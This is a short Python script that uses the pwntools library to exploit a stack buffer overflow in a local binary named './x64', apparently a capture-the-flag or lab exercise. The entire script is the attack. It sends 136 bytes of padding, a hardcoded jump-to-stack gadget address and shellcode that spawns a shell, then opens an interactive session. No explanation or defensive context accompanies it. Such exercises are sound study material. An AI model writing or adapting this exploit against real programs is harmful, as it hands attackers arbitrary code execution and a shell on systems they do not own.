from pwn import *

context(arch='amd64',os='linux')
p = process('./x64')

input=b'A'*136
jmpesp=p64(0x00007ffff7f5f003)
shellcode = asm(shellcraft.sh())
payload=input+jmpesp+shellcode

p.send(payload)
p.interactive()